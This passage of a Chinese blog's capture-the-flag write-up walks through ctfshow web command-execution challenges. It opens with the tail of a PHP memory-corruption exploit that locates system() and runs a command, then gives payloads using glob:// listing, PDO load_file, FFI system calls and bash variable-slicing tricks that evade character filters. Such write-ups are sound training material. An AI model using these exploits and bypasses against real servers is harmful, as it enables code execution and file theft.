class="variable">$abc</span>, <span class="number">0x18</span>, <span class="number">0xa</span>);    <span class="variable">$closure_obj</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>);    <span class="variable">$binary_leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_handlers</span>, <span class="number">8</span>);    <span class="keyword">if</span>(!(<span class="variable">$base</span> = <span class="title function_ invoke__">get_binary_base</span>(<span class="variable">$binary_leak</span>))) &#123;        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);    &#125;    <span class="keyword">if</span>(!(<span class="variable">$elf</span> = <span class="title function_ invoke__">parse_elf</span>(<span class="variable">$base</span>))) &#123;        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);    &#125;    <span class="keyword">if</span>(!(<span class="variable">$basic_funcs</span> = <span class="title function_ invoke__">get_basic_funcs</span>(<span class="variable">$base</span>, <span class="variable">$elf</span>))) &#123;        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);    &#125;    <span class="keyword">if</span>(!(<span class="variable">$zif_system</span> = <span class="title function_ invoke__">get_system</span>(<span class="variable">$basic_funcs</span>))) &#123;        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);    &#125;    <span class="variable">$fake_obj_offset</span> = <span class="number">0xd0</span>;    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x110</span>; <span class="variable">$i</span> += <span class="number">8</span>) &#123;        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="variable">$fake_obj_offset</span> + <span class="variable">$i</span>, <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_obj</span>, <span class="variable">$i</span>));    &#125;    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_obj_offset</span>);    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>);     <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x68</span>, <span class="variable">$zif_system</span>);     (<span class="variable">$helper</span>-&gt;b)(<span class="variable">$cmd</span>);    <span class="keyword">exit</span>();&#125;<span class="title function_ invoke__">ctfshow</span>(<span class="string">&quot;cat /flag0.txt&quot;</span>);<span class="title function_ invoke__">ob_end_flush</span>();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>记得要<code>url</code>编码一下</p>
<p><img src="/../images/2272328-20211025183837125-735643009-172511270290154.png" alt="image-20211025011503081"></p>
<h3 id="web73"><a href="#web73" class="headerlink" title="web73"></a>web73</h3><p>老方法查flag位置 不过这次flag文件名改了</p>
<p>然后文件包含就行</p>
<p><img src="/../images/image-20240822173804876-172511270290155.png" alt="image-20240822173804876"></p>
<p><img src="/../images/image-20240822173907561-172511270290156.png" alt="image-20240822173907561"></p>
<h3 id="web74"><a href="#web74" class="headerlink" title="web74"></a>web74</h3><p>这题和72类似 限制了读取目录</p>
<p>所以还有用glob伪协议读取文件名称</p>
<p>c&#x3D;$a&#x3D;”glob:&#x2F;&#x2F;&#x2F;*.txt”; if($b&#x3D;opendir($a)){   while (($file &#x3D; readdir($b)) !&#x3D;&#x3D; false){     echo “filename:”.$file.”\n”; }closedir($b);}exit();</p>
<p><img src="/../images/image-20240822190324625-172511270290157.png" alt="image-20240822190324625"></p>
<p><img src="/../images/image-20240822190353118-172511270290158.png" alt="image-20240822190353118"></p>
<p>然后再文件包含得到flag</p>
<h3 id="web75"><a href="#web75" class="headerlink" title="web75"></a>web75</h3><p>还是老办法读目录（glob）</p>
<p><img src="/../images/image-20240822201216782-172511270290159.png" alt="image-20240822201216782"></p>
<p>使用pod来读取查询flag </p>
<p>PHP 数据对象 （PDO） 扩展为PHP访问数据库定义了一个轻量级的一致接口。</p>
<p>PDO 提供了一个数据访问抽象层，这意味着，不管使用哪种数据库，都可以用相同的函数（方法）来查询和获取数据。</p>
<p>PDO随PHP5.1发行，应用条件是PHP&gt;5.1</p>
<p> 如何编写pod不是很清楚</p>
<p>参考payload</p>
<p>c&#x3D;<br>try {<br>    $dbh &#x3D; new PDO(‘mysql:host&#x3D;localhost;dbname&#x3D;ctftraining’, ‘root’,<br>        ‘root’);</p>
<pre><code>foreach ($dbh-&gt;query(&#39;select load_file(&quot;/flag36.txt&quot;)&#39;) as $row) &#123;
    echo ($row[0]) . &quot;|&quot;;
&#125;
$dbh = null;
</code></pre>
<p>} catch (PDOException $e) {<br>    echo $e-&gt;getMessage();<br>    exit(0);<br>}<br>exit(0);</p>
<h3 id="web76"><a href="#web76" class="headerlink" title="web76"></a>web76</h3><p>同上</p>
<h3 id="web77"><a href="#web77" class="headerlink" title="web77"></a>web77</h3><p>这题在题干中说到php7.4，可以想到FFI</p>
<p>FFI（Foreign Function Interface），即外部函数接口，是指在一种语言里调用另一种语言代码的技术。PHP的FFI扩展就是一个让你在PHP里调用C代码的技术。</p>
<p>通过FFI，可以实现调用system函数，从而将flag直接写入一个新建的文本文件中，然后访问这个文本文件，获得flag<br>payload：<br>第一种：</p>
<p>&#x2F;&#x2F;首先是熟悉的确定flag位置和名称</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="meta">?&gt;</span><span class="meta">&lt;?php</span> </span><br><span class="line">	<span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>); </span><br><span class="line">	<span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>) </span><br><span class="line">	&#123; </span><br><span class="line">		<span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&#x27;  &#x27;</span>);</span><br><span class="line">	&#125; </span><br><span class="line">	<span class="keyword">exit</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//FFI调用system函数</span></span><br><span class="line">c=</span><br><span class="line"><span class="variable">$ffi</span>=FFI :: <span class="title function_ invoke__">cdef</span>(<span class="string">&quot;int system(const char *command);&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;/readflag &gt; 1.txt&#x27;</span>;</span><br><span class="line"><span class="variable">$ffi</span>-&gt;<span class="title function_ invoke__">system</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">第二种：</span><br><span class="line"></span><br><span class="line">c=</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$f</span>.<span class="string">&quot;    &quot;</span> ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ffi</span> = FFI::<span class="title function_ invoke__">cdef</span>(</span><br><span class="line">    <span class="string">&quot;int system(const char *command);&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$ffi</span>-&gt;<span class="title function_ invoke__">system</span>(<span class="string">&quot;/readflag &gt; 1.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure>

<p>再访问1.txt</p>
<h3 id="web118"><a href="#web118" class="headerlink" title="web118"></a>web118</h3><p>可以了解一下Linux的bash 的相关知识</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/sparkdev/p/9934595.html#title_pwd">https://www.cnblogs.com/sparkdev/p/9934595.html#title_pwd</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.51cto.com/allenh/1695810">https://blog.51cto.com/allenh/1695810</a></p>
<p>root@baba:<del># echo ${PWD}<br>&#x2F;root<br>root@baba:</del># echo ${PWD:1:1}   &#x2F;&#x2F;表示从第2（1+1）个字符开始的一个字符<br>r<br>root@baba:<del># echo ${PWD:0:1}   &#x2F;&#x2F;表示从第1（0+1）个字符开始的一个字符<br>&#x2F;<br>root@baba:</del># echo ${PWD:<del>0:1}  &#x2F;&#x2F;表示从最后一个字符开始的一个字符<br>t<br>root@baba:</del># echo ${PWD:~A}    &#x2F;&#x2F;字母代表0<br>t</p>
<p>所以可以利用各个环境变量的最后一位来构造命令。 ${PWD}在这题肯定是&#x2F;var&#x2F;www&#x2F;html，而${PATH}通常是bin,那么${PWD:<del>A}的结果就应该是’ l ‘，因为${PATH:</del>A}的结果是’ n ‘，那么他们拼接在一起正好是nl，能够读取flag，因为通配符没有被过滤，所以可以用通配符代替flag.php</p>
<p>payload：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">code=$&#123;PATH:~A&#125;$&#123;PWD:~A&#125; ????.???</span><br><span class="line"></span><br><span class="line"><span class="number">12</span></span><br></pre></td></tr></table></figure>

<p>如果是在框中输就去掉code&#x3D;<br>查看源码即可得到flag</p>
<h3 id="web119"><a href="#web119" class="headerlink" title="web119"></a>web119</h3><p>多过滤了一个path </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">方法一：</span><br><span class="line">可以构造出/bin/base64 flag.php，只需要/和4两个字符就行，其他的可以用通配符代替。</span><br><span class="line">/很简单，pwd的第一位就是，因为这题ban了数字，所以可以用该题值必是1的$&#123;#SHLVL&#125;绕过</span><br><span class="line"></span><br><span class="line">SHLVL</span><br><span class="line">是记录多个 Bash 进程实例嵌套深度的累加器,进程第一次打开shell时$&#123;SHLVL&#125;=1，然后在此shell中再打开一个shell时$SHLVL=2。</span><br><span class="line"></span><br><span class="line">只需要$&#123;PWD::$&#123;SHLVL&#125;&#125;，结果就是/</span><br><span class="line"></span><br><span class="line">RANDOM</span><br><span class="line">此变量值，随机出现整数，范围为0-32767。不过，虽然说是随机，但并不是真正的随机，因为每次得到的随机数都一样。为此，在使用RANDOM变量前，请随意设定一个数字给RANDOM，当做随机数种子，这样才不会每次产生的随机数其顺序都一样。</span><br><span class="line"></span><br><span class="line">4的问题，可以用$&#123;#RANDOM&#125;，在Linux中，$&#123;#xxx&#125;显示的是这个值的位数不加#是变量的值，加了#是变量的值的长度，例如12345的值是5，而random函数绝大部分产生的数字都是4位或者5位的，因此可以代替4.</span><br><span class="line">payload：</span><br><span class="line"></span><br><span class="line">code=$&#123;PWD::$&#123;#SHLVL&#125;&#125;???$&#123;PWD::$&#123;#SHLVL&#125;&#125;?????$&#123;#RANDOM&#125; ????.???</span><br><span class="line"></span><br><span class="line">方法二</span><br><span class="line"></span><br><span class="line">可以构造/bin/cat flag.php,需要t和/，$&#123;HOME&#125;默认是/root，所以需要得到他的最后一个字母,容器的hostname应该是5个字母，所以$&#123;#HOSTNAME&#125;可以从第5位开始，1还是用$&#123;#SHLVL&#125;代替</span><br><span class="line">payload：</span><br><span class="line"></span><br><span class="line">code=$&#123;PWD::$&#123;#SHLVL&#125;&#125;???$&#123;PWD::$&#123;#SHLVL&#125;&#125;??$&#123;HOME:$&#123;#HOSTNAME&#125;:$&#123;#SHLVL&#125;&#125; ????.???</span><br><span class="line">1</span><br><span class="line">查看源码即可得到flag</span><br></pre></td></tr></table></figure>




<h3 id="web120"><a href="#web120" class="headerlink" title="web120"></a>web120</h3><p>对长度进行了限制64及以内 其他的同119一样</p>
<p>采用119的方法二即可</p>
<h3 id="web122"><a href="#web122" class="headerlink" title="web122"></a>web122</h3><p>这题在上题的基础上又过滤了#和PWD，PWD的绕过很简单，用HOME就可以，而#,就要用到$?了</p>
<p>$? 执行上一个指令的返回值 (显示最后命令的退出状态。0表示没有错误，其他任何值表明有错误)<br>1<br>所以在使用$?之前要先给错误的命令 让$?的值为1<br>${}和 &lt;A可以但是题目上${}这个不可以<br>所以用&lt;A后边的数字4还是用RANDOM随机数来获取<br>payload：</p>
<p>code&#x3D;&lt;A;${HOME::$?}???${HOME::$?}?????${RANDOM::$?} ????.???</p>
<h3 id="web124"><a href="#web124" class="headerlink" title="web124"></a>web124</h3><p>参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_49480008/article/details/113177878">https://blog.csdn.net/qq_49480008/article/details/113177878</a></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">Gizz</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2024/08/31/ctf-web%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">http://example.com/2024/08/31/ctf-web%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">Gizz's BLOG</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/image/%E5%A4%B4%E5%83%8F.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/09/01/ctf-php%E7%89%B9%E6%80%A7/" title="ctf-php特性"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">ctf-php特性</div></div></a></div><div class="next-post pull-right"><a href="/2024/08/31/ctf-web%E7%88%86%E7%A0%B4/" title="ctf-web爆破"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">ctf-web爆破</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/image/%E5%A4%B4%E5%83%8F.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Gizz</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">9</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">1.</span> <span class="toc-text">web命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F-https-blog-csdn-net-2301-76690905-article-details-134533626"><span class="toc-number">1.1.</span> <span class="toc-text">常用绕过方式:https:&#x2F;&#x2F;blog.csdn.net&#x2F;2301_76690905&#x2F;article&#x2F;details&#x2F;134533626</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0"><span class="toc-number">1.1.1.</span> <span class="toc-text">常用函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87"><span class="toc-number">1.1.2.</span> <span class="toc-text">空格绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%90%8D%E7%BB%95%E8%BF%87"><span class="toc-number">1.1.3.</span> <span class="toc-text">文件名绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96%E5%91%BD%E4%BB%A4%E7%BB%95%E8%BF%87"><span class="toc-number">1.1.4.</span> <span class="toc-text">读取命令绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E7%BB%95%E8%BF%87"><span class="toc-number">1.1.5.</span> <span class="toc-text">无字母数字绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%87%BD%E6%95%B0"><span class="toc-number">1.1.6.</span> <span class="toc-text">读取文件函数</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.2.</span> <span class="toc-text">php伪协议</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#php-filter"><span class="toc-number">1.2.1.</span> <span class="toc-text">php:&#x2F;&#x2F;filter:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#php-input"><span class="toc-number">1.2.2.</span> <span class="toc-text">php:&#x2F;&#x2F;input:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#data-text-plain"><span class="toc-number">1.2.3.</span> <span class="toc-text">data:&#x2F;&#x2F;text&#x2F;plain:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#zip"><span class="toc-number">1.2.4.</span> <span class="toc-text">zip:&#x2F;&#x2F;:</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web29"><span class="toc-number">1.3.</span> <span class="toc-text">web29</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web30"><span class="toc-number">1.4.</span> <span class="toc-text">web30</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web31"><span class="toc-number">1.5.</span> <span class="toc-text">web31</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web32"><span class="toc-number">1.6.</span> <span class="toc-text">web32</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web33"><span class="toc-number">1.7.</span> <span class="toc-text">web33</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web34"><span class="toc-number">1.8.</span> <span class="toc-text">web34</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web35"><span class="toc-number">1.9.</span> <span class="toc-text">web35</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web36"><span class="toc-number">1.10.</span> <span class="toc-text">web36</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web37"><span class="toc-number">1.11.</span> <span class="toc-text">web37</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web38"><span class="toc-number">1.12.</span> <span class="toc-text">web38</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web39"><span class="toc-number">1.13.</span> <span class="toc-text">web39</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web40"><span class="toc-number">1.14.</span> <span class="toc-text">web40</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web41"><span class="toc-number">1.15.</span> <span class="toc-text">web41</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web42"><span class="toc-number">1.16.</span> <span class="toc-text">web42</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web43"><span class="toc-number">1.17.</span> <span class="toc-text">web43</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web44"><span class="toc-number">1.18.</span> <span class="toc-text">web44</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web45"><span class="toc-number">1.19.</span> <span class="toc-text">web45</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web46"><span class="toc-number">1.20.</span> <span class="toc-text">web46</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web47"><span class="toc-number">1.21.</span> <span class="toc-text">web47</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web48"><span class="toc-number">1.22.</span> <span class="toc-text">web48</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web49"><span class="toc-number">1.23.</span> <span class="toc-text">web49</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web50"><span class="toc-number">1.24.</span> <span class="toc-text">web50</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web51"><span class="toc-number">1.25.</span> <span class="toc-text">web51</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web52"><span class="toc-number">1.26.</span> <span class="toc-text">web52</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web53"><span class="toc-number">1.27.</span> <span class="toc-text">web53</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web54"><span class="toc-number">1.28.</span> <span class="toc-text">web54</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web55"><span class="toc-number">1.29.</span> <span class="toc-text">web55</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web56"><span class="toc-number">1.30.</span> <span class="toc-text">web56</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web57"><span class="toc-number">1.31.</span> <span class="toc-text">web57</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web58-65"><span class="toc-number">1.32.</span> <span class="toc-text">web58-65</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web66"><span class="toc-number">1.33.</span> <span class="toc-text">web66</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web67"><span class="toc-number">1.34.</span> <span class="toc-text">web67</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web68"><span class="toc-number">1.35.</span> <span class="toc-text">web68</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web69"><span class="toc-number">1.36.</span> <span class="toc-text">web69</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web70"><span class="toc-number">1.37.</span> <span class="toc-text">web70</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web71"><span class="toc-number">1.38.</span> <span class="toc-text">web71</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web72"><span class="toc-number">1.39.</span> <span class="toc-text">web72</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web73"><span class="toc-number">1.40.</span> <span class="toc-text">web73</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web74"><span class="toc-number">1.41.</span> <span class="toc-text">web74</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web75"><span class="toc-number">1.42.</span> <span class="toc-text">web75</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web76"><span class="toc-number">1.43.</span> <span class="toc-text">web76</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web77"><span class="toc-number">1.44.</span> <span class="toc-text">web77</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web118"><span class="toc-number">1.45.</span> <span class="toc-text">web118</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web119"><span class="toc-number">1.46.</span> <span class="toc-text">web119</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web120"><span class="toc-number">1.47.</span> <span class="toc-text">web120</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web122"><span class="toc-number">1.48.</span> <span class="toc-text">web122</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web124"><span class="toc-number">1.49.</span> <span class="toc-text">web124</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/09/01/web-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" title="ctf-web文件上传">ctf-web文件上传</a><time datetime="2024-09-01T02:02:28.000Z" title="发表于 2024-09-01 10:02:28">2024-09-01</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/09/01/web-sql%E6%B3%A8%E5%85%A5/" title="ctf-web sql注入">ctf-web sql注入</a><time datetime="2024-09-01T02:01:32.000Z" title="发表于 2024-09-01 10:01:32">2024-09-01</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/09/01/ctf-php%E7%89%B9%E6%80%A7/" title="ctf-php特性">ctf-php特性</a><time datetime="2024-09-01T01:53:27.000Z" title="发表于 2024-09-01 09:53:27">2024-09-01</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/31/ctf-web%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" title="ctf-web命令执行">ctf-web命令执行</a><time datetime="2024-08-31T13:57:44.000Z" title="发表于 2024-08-31 21:57:44">2024-08-31</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/31/ctf-web%E7%88%86%E7%A0%B4/" title="ctf-web爆破">ctf-web爆破</a><time datetime="2024-08-31T13:56:52.000Z" title="发表于 2024-08-31 21:56:52">2024-08-31</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/image/top.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By Gizz</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>